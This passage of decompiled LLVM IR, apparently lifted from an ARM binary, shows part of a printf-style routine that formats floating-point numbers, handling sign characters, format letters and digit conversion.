  %v2_146c0 = inttoptr i32 %v1_146c0 to i8*
  %v3_146c0 = load i8, i8* %v2_146c0, align 1
  %v4_146c0 = zext i8 %v3_146c0 to i32
  store i32 %v4_146c0, i32* @sl, align 4
  store i32 %tmp, i32* %stack_var_-200, align 4
  %v1_146cc = or i32 %v4_146c0, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_146d0 = icmp ult i32 %v1_146cc, 97
  store i1 %v6_146d0, i1* %cpsr_n.global-to-local, align 1
  %v7_146d0 = icmp eq i32 %v1_146cc, 97
  store i1 %v7_146d0, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_146e4 = load i32, i32* %arg4, align 4
  store i32 %v2_146e4, i32* %r1.global-to-local, align 4
  br i1 %v7_146d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_146bc
  %v2_146e8 = add nuw nsw i32 %v4_146c0, 6
  store i32 %v2_146e8, i32* %r3.global-to-local, align 4
  %v2_146f0 = urem i32 %v2_146e8, 256
  store i32 %v2_146f0, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_146bc, %bb
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %v2_146e4, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_14708 = add i32 %tmp, 12
  %v2_14708 = inttoptr i32 %v1_14708 to i32*
  %v3_14708 = load i32, i32* %v2_14708, align 4
  store i32 %v3_14708, i32* %r2.global-to-local, align 4
  %v1_1470c = add i32 %tmp, 4
  %v2_1470c = inttoptr i32 %v1_1470c to i32*
  %v3_1470c = load i32, i32* %v2_1470c, align 4
  store i32 %v3_1470c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14710 = icmp slt i32 %v2_146e4, 0
  store i1 %v1_14710, i1* %cpsr_n.global-to-local, align 1
  %v2_14710 = icmp eq i32 %v2_146e4, 0
  store i1 %v2_14710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_14710, label %bb221, label %bb222

bb221:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.thread, %bb221
  %v1_14a70 = phi i32 [ %v2_146e4, %.thread ], [ 6, %bb221 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1471c = and i32 %v3_14708, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1471c = icmp eq i32 %v1_1471c, 0
  store i1 %v2_1471c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_1471c, label %dec_label_pc_14734, label %dec_label_pc_14740

dec_label_pc_14734:                               ; preds = %bb222
  %v1_14734 = urem i32 %v3_14708, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14734 = icmp eq i32 %v1_14734, 0
  store i1 %v2_14734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14734, label %dec_label_pc_14744, label %dec_label_pc_14740

dec_label_pc_14740:                               ; preds = %dec_label_pc_14734, %bb222
  %storemerge = phi i32 [ 43, %bb222 ], [ 32, %dec_label_pc_14734 ]
  %v0_14740.off0 = phi i8 [ 43, %bb222 ], [ 32, %dec_label_pc_14734 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_14740.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %dec_label_pc_14734, %dec_label_pc_14740
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_14760 = call i32 @function_16578()
  store i32 %v0_14760, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14764 = icmp slt i32 %v0_14760, 0
  store i1 %v1_14764, i1* %cpsr_n.global-to-local, align 1
  %v2_14764 = icmp eq i32 %v0_14760, 0
  store i1 %v2_14764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14764, label %dec_label_pc_14774, label %bb224

bb224:                                            ; preds = %dec_label_pc_14744
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14828

dec_label_pc_14774:                               ; preds = %dec_label_pc_14744
  %v0_14774 = load i32, i32* @r6, align 4
  store i32 %v0_14774, i32* @r0, align 4
  %v0_14778 = load i32, i32* @r7, align 4
  store i32 %v0_14778, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14784 = call i32 @function_16578()
  store i32 %v0_14784, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14788 = icmp slt i32 %v0_14784, 0
  store i1 %v1_14788, i1* %cpsr_n.global-to-local, align 1
  %v2_14788 = icmp eq i32 %v0_14784, 0
  store i1 %v2_14788, i1* %cpsr_z.global-to-local, align 1
  %v0_14790 = load i32, i32* @r6, align 4
  br i1 %v2_14788, label %dec_label_pc_14790, label %dec_label_pc_147d0

dec_label_pc_14790:                               ; preds = %dec_label_pc_14774
  store i32 %v0_14790, i32* %r2.global-to-local, align 4
  %v0_14794 = load i32, i32* @r7, align 4
  store i32 %v0_14794, i32* %r3.global-to-local, align 4
  store i32 1072693248, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_147a0 = call i32 @function_16364(i32 1072693248, i32 0, i32 %v0_14790, i32 %v0_14794)
  store i32 %v4_147a0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v1_147ac = call i32 @function_16570(i32 %v4_147a0)
  store i32 %v1_147ac, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147b0 = icmp slt i32 %v1_147ac, 0
  store i1 %v1_147b0, i1* %cpsr_n.global-to-local, align 1
  %v2_147b0 = icmp eq i32 %v1_147ac, 0
  store i1 %v2_147b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_147b0, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_14790
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14998

bb226:                                            ; preds = %dec_label_pc_14790
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-42, align 1
  br label %dec_label_pc_14998

dec_label_pc_147d0:                               ; preds = %dec_label_pc_14774
  store i32 %v0_14790, i32* @r0, align 4
  %v0_147d4 = load i32, i32* @r7, align 4
  store i32 %v0_147d4, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_147e0 = call i32 @function_16570(i32 %v0_14790)
  store i32 %v4_147e0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147e4 = icmp slt i32 %v4_147e0, 0
  store i1 %v1_147e4, i1* %cpsr_n.global-to-local, align 1
  %v2_147e4 = icmp eq i32 %v4_147e0, 0
  store i1 %v2_147e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_147e4, label %bb227, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_147d0
  %v0_14800.pre = load i32, i32* @r6, align 4
  br label %bb228

bb227:                                            ; preds = %dec_label_pc_147d0
  store i32 45, i32* %r2.global-to-local, align 4
  %v3_147ec = load i32, i32* @r6, align 4
  %v4_147ec = sub i32 0, %v3_147ec
  store i32 %v4_147ec, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-42, align 1
  store i32 %v4_147ec, i32* @r6, align 4
  br label %bb228

bb228:                                            ; preds = %._crit_edge, %bb227
  %v0_14800 = phi i32 [ %v0_14800.pre, %._crit_edge ], [ %v4_147ec, %bb227 ]
  store i32 1070596096, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_14800, i32* %r0.global-to-local, align 4
  %v0_14804 = load i32, i32* @r7, align 4
  store i32 %v0_14804, i32* %r1.global-to-local, align 4
  %v4_14808 = call i32 @function_1603c(i32 %v0_14800, i32 %v0_14804, i32 1070596096, i32 0)
  store i32 %v4_14808, i32* %r2.global-to-local, align 4
  store i32 %v0_14804, i32* %r3.global-to-local, align 4
  %v0_14814 = load i32, i32* @r6, align 4
  store i32 %v0_14814, i32* @r0, align 4
  %v0_14818 = load i32, i32* @r7, align 4
  store i32 %v0_14818, i32* %r1.global-to-local, align 4
  %v0_1481c = call i32 @function_16578()
  store i32 %v0_1481c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14820 = icmp slt i32 %v0_1481c, 0
  store i1 %v1_14820, i1* %cpsr_n.global-to-local, align 1
  %v2_14820 = icmp eq i32 %v0_1481c, 0
  store i1 %v2_14820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14820, label %dec_label_pc_14828, label %dec_label_pc_1486c

dec_label_pc_14828:                               ; preds = %bb224, %bb228
  %v0_14758.v1_1476c8 = phi i32 [ 0, %bb228 ], [ 8, %bb224 ]
  %v2_14828 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_14828, i32* %ip.global-to-local, align 4
  %v2_14830 = add i32 %v2_14828, 16
  %v3_14830 = inttoptr i32 %v2_14830 to i32*
  store i32 32, i32* %v3_14830, align 4
  %v0_14838 = load i32, i32* @sl, align 4
  %v1_14838 = add i32 %v0_14838, -96
  %v3_14838 = sub i32 95, %v0_14838
  %v4_14838 = and i32 %v3_14838, %v0_14838
  %v5_14838 = icmp slt i32 %v4_14838, 0
  store i1 %v5_14838, i1* %cpsr_v.global-to-local, align 1
  %v6_14838 = icmp slt i32 %v1_14838, 0
  store i1 %v6_14838, i1* %cpsr_n.global-to-local, align 1
  %v7_14838 = icmp eq i32 %v0_14838, 96
  store i1 %v7_14838, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp287 = icmp ult i32 %v0_14838, 97
  br i1 %tmp287, label %bb229, label %.thread121

bb229:                                            ; preds = %dec_label_pc_14828
  %v5_1484c = or i32 %v0_14758.v1_1476c8, 4
  store i32 %v5_1484c, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_14828, %bb229
  %v4_14850 = phi i32 [ %v5_1484c, %bb229 ], [ 3, %dec_label_pc_14828 ]
  %v4_14850.v0_14758.v1_1476c = select i1 %tmp287, i32 %v4_14850, i32 %v0_14758.v1_1476c8
  store i32 ptrtoint ([4 x i8]* @global_var_1819c.408 to i32), i32* %r2.global-to-local, align 4
  %v2_1485c = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_1485c, i32* %r6.global-to-local, align 4
  %v2_14860 = add i32 %v4_14850.v0_14758.v1_1476c, ptrtoint ([4 x i8]* @global_var_1819c.408 to i32)
  store i32 %v2_14860, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14da4

dec_label_pc_1486c:                               ; preds = %bb228
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_1487c = load i32, i32* @r6, align 4
  store i32 %v0_1487c, i32* @r4, align 4
  %v0_14880 = load i32, i32* @r7, align 4
  store i32 %v0_14880, i32* @r5, align 4
  store i32 256, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14888

dec_label_pc_14888:                               ; preds = %dec_label_pc_1493c.dec_label_pc_14888_crit_edge, %dec_label_pc_1486c
  %v0_14894 = phi i32 [ %v0_1487c, %dec_label_pc_1486c ], [ %v0_14894.pre, %dec_label_pc_1493c.dec_label_pc_14888_crit_edge ]
  %v0_14888 = phi i32 [ %v0_14880, %dec_label_pc_1486c ], [ %v0_14888.pre, %dec_label_pc_1493c.dec_label_pc_14888_crit_edge ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_1486c ], [ %v1_148a0, %dec_label_pc_1493c.dec_label_pc_14888_crit_edge ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_1486c ], [ %stack_var_-192.5, %dec_label_pc_1493c.dec_label_pc_14888_crit_edge ]
  store i32 %v0_14888, i32* @r1, align 4
  store i32 1100470148, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v0_14894, i32* @r0, align 4
  %v4_14898 = call i32 @function_16570(i32 %v0_14894)
  %v1_148a0 = add i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_181b0.411 to i32), i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148b0 = icmp slt i32 %v4_14898, 0
  store i1 %v1_148b0, i1* %cpsr_n.global-to-local, align 1
  %v2_148b0 = icmp eq i32 %v4_14898, 0
  store i1 %v2_148b0, i1* %cpsr_z.global-to-local, align 1
  %v3_148b4 = mul i32 %v1_148a0, 8
  store i32 %v3_148b4, i32* %r3.global-to-local, align 4
  %v0_148b8 = load i32, i32* @r4, align 4
  store i32 %v0_148b8, i32* %r0.global-to-local, align 4
  %v0_148bc = load i32, i32* @r5, align 4
  store i32 %v0_148bc, i32* %r1.global-to-local, align 4
  %v2_148c0 = add i32 %v3_148b4, ptrtoint (i32* @global_var_181b0.411 to i32)
  store i32 %v2_148c0, i32* %ip.global-to-local, align 4
  %v1_148c8 = inttoptr i32 %v2_148c0 to i32*
  %v2_148c8 = load i32, i32* %v1_148c8, align 4
  store i32 %v2_148c8, i32* %r2.global-to-local, align 4
  %v3_148c8 = add i32 %v3_148b4, add (i32 ptrtoint (i32* @global_var_181b0.411 to i32), i32 4)
  %v4_148c8 = inttoptr i32 %v3_148c8 to i32*
  %v5_148c8 = load i32, i32* %v4_148c8, align 4
  store i32 %v5_148c8, i32* %r3.global-to-local, align 4
  br i1 %v1_148b0, label %dec_label_pc_148c8, label %dec_label_pc_148fc

dec_label_pc_148c8:                               ; preds = %dec_label_pc_14888
  %v5_148cc = call i32 @function_1603c(i32 %v0_148b8, i32 %v0_148bc, i32 %v2_148c8, i32 %v5_148c8)
  store i32 %v5_148cc, i32* @r0, align 4
  store i32 1104006501, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v5_148cc, i32* @r8, align 4
  store i32 %v0_148bc, i32* @sb, align 4
  %v1_148e0 = call i32 @function_16570(i32 %v5_148cc)
  store i32 %v1_148e0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148e4 = icmp slt i32 %v1_148e0, 0
  store i1 %v1_148e4, i1* %cpsr_n.global-to-local, align 1
  %v2_148e4 = icmp eq i32 %v1_148e0, 0
  store i1 %v2_148e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_148e4, label %.thread124, label %dec_label_pc_1493c

.thread124:                                       ; preds = %dec_label_pc_148c8
  %v3_148ec = load i32, i32* %fp.global-to-local, align 4
  %v5_148ec = sub i32 %stack_var_-192.2, %v3_148ec
  store i32 %v5_148ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14934

dec_label_pc_148fc:                               ; preds = %dec_label_pc_14888
  store i32 %v0_148b8, i32* %r0.global-to-local, align 4
  store i32 %v0_148bc, i32* %r1.global-to-local, align 4
  %v5_14908 = call i32 @function_16364(i32 %v0_148b8, i32 %v0_148bc, i32 %v2_148c8, i32 %v5_148c8)
  store i32 %v5_14908, i32* @r0, align 4
  store i32 1100470148, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v5_14908, i32* @r8, align 4
  store i32 %v0_148bc, i32* @sb, align 4
  %v4_1491c = call i32 @function_16568(i32 %v5_14908, i32 %v0_148bc, i32 1100470148, i32 0)
  store i32 %v4_1491c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14920 = icmp slt i32 %v4_1491c, 0
  store i1 %v1_14920, i1* %cpsr_n.global-to-local, align 1
  %v2_14920 = icmp eq i32 %v4_1491c, 0
  store i1 %v2_14920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_14920, label %dec_label_pc_1493c, label %dec_label_pc_14928

dec_label_pc_14928:                               ; preds = %dec_label_pc_148fc
  %v1_1492c = load i32, i32* %fp.global-to-local, align 4
  %v2_1492c = add i32 %v1_1492c, %stack_var_-192.2
  store i32 %v2_1492c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14934

dec_label_pc_14934:                               ; preds = %.thread124, %dec_label_pc_14928
  %stack_var_-192.4 = phi i32 [ %v2_1492c, %dec_label_pc_14928 ], [ %v5_148ec, %.thread124 ]
  %v0_14934 = load i32, i32* @r8, align 4
  store i32 %v0_14934, i32* @r4, align 4
  %v0_14938 = load i32, i32* @sb, align 4
  store i32 %v0_14938, i32* @r5, align 4
  br label %dec_label_pc_1493c

dec_label_pc_1493c:                               ; preds = %dec_label_pc_148c8, %dec_label_pc_148fc, %dec_label_pc_14934
  %stack_var_-192.5 = phi i32 [ %stack_var_-192.4, %dec_label_pc_14934 ], [ %stack_var_-192.2, %dec_label_pc_148fc ], [ %stack_var_-192.2, %dec_label_pc_148c8 ]
  store i32 %v1_148a0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14940 = icmp slt i32 %v1_148a0, 0
  store i1 %v1_14940, i1* %cpsr_n.global-to-local, align 1
  %v2_14940 = icmp eq i32 %v1_148a0, 0
  store i1 %v2_14940, i1* %cpsr_z.global-to-local, align 1
  %v0_14944 = load i32, i32* %fp.global-to-local, align 4
  %v3_14944 = sdiv i32 %v0_14944, 2
  store i32 %v3_14944, i32* %fp.global-to-local, align 4
  br i1 %v2_14940, label %dec_label_pc_1494c, label %dec_label_pc_1493c.dec_label_pc_14888_crit_edge

dec_label_pc_1493c.dec_label_pc_14888_crit_edge:  ; preds = %dec_label_pc_1493c
  %v0_14888.pre = load i32, i32* @r7, align 4
  %v0_14894.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14888

dec_label_pc_1494c:                               ; preds = %dec_label_pc_1493c
  %v0_1494c = load i32, i32* @r4, align 4
  store i32 %v0_1494c, i32* @r0, align 4
  %v0_14950 = load i32, i32* @r5, align 4
  store i32 %v0_14950, i32* @r1, align 4
  store i32 1104006501, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_1495c = call i32 @function_16568(i32 %v0_1494c, i32 %v0_14950, i32 1104006501, i32 0)
  store i32 %v4_1495c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14960 = icmp slt i32 %v4_1495c, 0
  store i1 %v1_14960, i1* %cpsr_n.global-to-local, align 1
  %v2_14960 = icmp eq i32 %v4_1495c, 0
  store i1 %v2_14960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_14960, label %.thread126, label %dec_label_pc_14970

.thread126:                                       ; preds = %dec_label_pc_1494c
  %v3_14964 = load i32, i32* @r4, align 4
  store i32 %v3_14964, i32* @r6, align 4
  %v3_14968 = load i32, i32* @r5, align 4
  store i32 %v3_14968, i32* @r7, align 4
  br label %dec_label_pc_14998

dec_label_pc_14970:                               ; preds = %dec_label_pc_1494c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14974 = load i32, i32* @r4, align 4
  store i32 %v0_14974, i32* %r0.global-to-local, align 4
  %v0_14978 = load i32, i32* @r5, align 4
  store i32 %v0_14978, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r2.global-to-local, align 4
  %v4_14980 = call i32 @function_16364(i32 %v0_14974, i32 %v0_14978, i32 1076101120, i32 0)
  store i32 %v4_14980, i32* %r0.global-to-local, align 4
  %v1_14988 = add i32 %stack_var_-192.5, 1
  store i32 %v1_14988, i32* %r3.global-to-local, align 4
  store i32 %v4_14980, i32* @r6, align 4
  store i32 %v0_14978, i32* @r7, align 4
  br label %dec_label_pc_14998

dec_label_pc_14998:                               ; preds = %.thread126, %bb225, %bb226, %dec_label_pc_14970
  %stack_var_-192.6 = phi i32 [ -1, %bb226 ], [ -1, %bb225 ], [ %v1_14988, %dec_label_pc_14970 ], [ %stack_var_-192.5, %.thread126 ]
  %v2_14998 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_14998, i32* @sb, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_149a0

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14a34, %dec_label_pc_14998
  %v0_149a0 = load i32, i32* @r7, align 4
  store i32 %v0_149a0, i32* %r1.global-to-local, align 4
  %v0_149a4 = load i32, i32* @r6, align 4
  store i32 %v0_149a4, i32* %r0.global-to-local, align 4
  %v2_149a8 = call i32 @function_16690(i32 %v0_149a4, i32 %v0_149a0)
  store i32 %v2_149a8, i32* @r0, align 4
  store i32 %v2_149a8, i32* @r4, align 4
  %v0_149b0 = call i32 @function_15f50()
  store i32 %v0_149b0, i32* @r0, align 4
  %v0_149b4 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_149b4 = icmp slt i32 %v0_149b4, 0
  store i1 %v1_149b4, i1* %cpsr_n.global-to-local, align 1
  %v2_149b4 = icmp eq i32 %v0_149b4, 0
  store i1 %v2_149b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_149b0, i32* %r2.global-to-local, align 4
  store i32 %v0_149a0, i32* %r3.global-to-local, align 4
  br i1 %v1_149b4, label %dec_label_pc_149c4, label %dec_label_pc_149d8

dec_label_pc_149c4:                               ; preds = %dec_label_pc_149a0
  store i32 1106247680, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_149cc = call i32 @function_15c48()
  store i32 %v0_149cc, i32* %r0.global-to-local, align 4
  store i32 %v0_149cc, i32* %r2.global-to-local, align 4
  store i32 %v0_149a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_149d8

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149a0, %dec_label_pc_149c4
  %v0_149d8 = load i32, i32* @r6, align 4
  store i32 %v0_149d8, i32* @r0, align 4
  %v0_149dc = load i32, i32* @r7, align 4
  store i32 %v0_149dc, i32* %r1.global-to-local, align 4
  %v2_149e0 = call i32 @function_15c44(i32 %v0_149d8, i32 %v0_149dc)
  store i32 %v2_149e0, i32* %r0.global-to-local, align 4
  store i32 1104006501, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_149ec = call i32 @function_1603c(i32 %v2_149e0, i32 %v0_149dc, i32 1104006501, i32 0)
  store i32 %v4_149ec, i32* %r0.global-to-local, align 4
  %v0_149f0 = load i32, i32* @sb, align 4
  %v1_149f0 = add i32 %v0_149f0, 9
  store i32 %v1_149f0, i32* @sb, align 4
  store i32 %v4_149ec, i32* @r6, align 4
  store i32 %v0_149dc, i32* @r7, align 4
  store i32 0, i32* @r5, align 4
  %v0_14a00.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14a00

dec_label_pc_14a00:                               ; preds = %dec_label_pc_14a00, %dec_label_pc_149d8
  %v0_14a00 = phi i32 [ %v0_14a24, %dec_label_pc_14a00 ], [ %v0_14a00.pre, %dec_label_pc_149d8 ]
  store i32 %v0_14a00, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_14a08 = call i32 @function_10328(i32 %v0_14a00, i32 10)
  %v0_14a0c = load i32, i32* @r5, align 4
  %v1_14a0c = add i32 %v0_14a0c, 1
  store i32 %v1_14a0c, i32* @r5, align 4
  %v1_14a10 = add i32 %v2_14a08, 48
  store i32 %v1_14a10, i32* %r2.global-to-local, align 4
  %v1_14a14 = load i32, i32* @sb, align 4
  %v2_14a14 = sub i32 %v1_14a14, %v1_14a0c
  store i32 %v2_14a14, i32* %r3.global-to-local, align 4
  %v0_14a18 = load i32, i32* @r4, align 4
  store i32 %v0_14a18, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v1_14a20 = trunc i32 %v1_14a10 to i8
  %v3_14a20 = inttoptr i32 %v2_14a14 to i8*
  store i8 %v1_14a20, i8* %v3_14a20, align 1
  %v0_14a24 = call i32 @function_10218()
  store i32 %v0_14a24, i32* %r0.global-to-local, align 4
  %v0_14a28 = load i32, i32* @r5, align 4
  %v1_14a28 = add i32 %v0_14a28, -8
  %v3_14a28 = sub i32 7, %v0_14a28
  %v4_14a28 = and i32 %v3_14a28, %v0_14a28
  %v5_14a28 = icmp slt i32 %v4_14a28, 0
  store i1 %v5_14a28, i1* %cpsr_v.global-to-local, align 1
  %v6_14a28 = icmp slt i32 %v1_14a28, 0
  store i1 %v6_14a28, i1* %cpsr_n.global-to-local, align 1
  %v7_14a28 = icmp eq i32 %v0_14a28, 8
  store i1 %v7_14a28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14a24, i32* @r4, align 4
  %v7_14a30 = icmp slt i32 %v0_14a28, 9
  br i1 %v7_14a30, label %dec_label_pc_14a00, label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a00
  %v0_14a34 = load i32, i32* @r8, align 4
  %v1_14a34 = add i32 %v0_14a34, 1
  store i32 %v1_14a34, i32* @r8, align 4
  %v3_14a38 = sub i32 -1, %v0_14a34
  %v4_14a38 = and i32 %v1_14a34, %v3_14a38
  %v5_14a38 = icmp slt i32 %v4_14a38, 0
  store i1 %v5_14a38, i1* %cpsr_v.global-to-local, align 1
  %v6_14a38 = icmp slt i32 %v0_14a34, 0
  store i1 %v6_14a38, i1* %cpsr_n.global-to-local, align 1
  %v7_14a38 = icmp eq i32 %v0_14a34, 0
  store i1 %v7_14a38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14a38, label %dec_label_pc_149a0, label %dec_label_pc_14a40

dec_label_pc_14a40:                               ; preds = %dec_label_pc_14a34
  %v0_14a40 = load i32, i32* @sl, align 4
  %v1_14a40 = add i32 %v0_14a40, -96
  %v3_14a40 = sub i32 95, %v0_14a40
  %v4_14a40 = and i32 %v3_14a40, %v0_14a40
  %v5_14a40 = icmp slt i32 %v4_14a40, 0
  store i1 %v5_14a40, i1* %cpsr_v.global-to-local, align 1
  %v6_14a40 = icmp slt i32 %v1_14a40, 0
  store i1 %v6_14a40, i1* %cpsr_n.global-to-local, align 1
  %v7_14a40 = icmp eq i32 %v0_14a40, 96
  store i1 %v7_14a40, i1* %cpsr_z.global-to-local, align 1
  %tmp288 = icmp ult i32 %v0_14a40, 97
  store i32 %v1_14a70, i32* %ip.global-to-local, align 4
  br i1 %tmp288, label %bb230, label %thread-pre-split

bb230:                                            ; preds = %dec_label_pc_14a40
  %v5_14a50 = add i32 %v0_14a40, 32
  store i32 %v5_14a50, i32* %r3.global-to-local, align 4
  %v5_14a54 = urem i32 %v5_14a50, 256
  store i32 %v5_14a54, i32* @sl, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14a40, %bb230
  %v0_14a78 = phi i32 [ %v5_14a54, %bb230 ], [ %v0_14a40, %dec_label_pc_14a40 ]
  %stack_var_-58.0130137 = phi i32 [ 69, %bb230 ], [ 101, %dec_label_pc_14a40 ]
  %v7_14a58 = icmp eq i32 %v0_14a78, 103
  %. = zext i1 %v7_14a58 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14a64 = icmp slt i32 %v1_14a70, 0
  store i1 %v1_14a64, i1* %cpsr_n.global-to-local, align 1
  %v2_14a64 = icmp eq i32 %v1_14a70, 0
  store i1 %v2_14a64, i1* %cpsr_z.global-to-local, align 1
  %tmp233 = icmp slt i32 %v1_14a70, 1
  br i1 %tmp233, label %.thread12, label %bb234

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb236

bb234:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14a6c = icmp eq i1 %v7_14a58, false
  store i1 %v2_14a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a6c, label %bb236, label %bb235

bb235:                                            ; preds = %bb234
  %v2_14a70 = add i32 %v1_14a70, -1
  store i32 %v2_14a70, i32* %ip.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %.thread12, %bb234, %bb235
  %v0_14a74 = phi i32 [ %v1_14a70, %.thread12 ], [ %v1_14a70, %bb234 ], [ %v2_14a70, %bb235 ]
  %v1_14a78 = add i32 %v0_14a78, -102
  %v3_14a78 = sub i32 101, %v0_14a78
  %v4_14a78 = and i32 %v3_14a78, %v0_14a78
  %v5_14a78 = icmp slt i32 %v4_14a78, 0
  store i1 %v5_14a78, i1* %cpsr_v.global-to-local, align 1
  %v6_14a78 = icmp slt i32 %v1_14a78, 0
  store i1 %v6_14a78, i1* %cpsr_n.global-to-local, align 1
  %v7_14a78 = icmp eq i32 %v0_14a78, 102
  store i1 %v7_14a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14a78, label %dec_label_pc_14a84, label %bb237

bb237:                                            ; preds = %bb236
  store i32 %v0_14a74, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14ab0

dec_label_pc_14a84:                               ; preds = %bb236
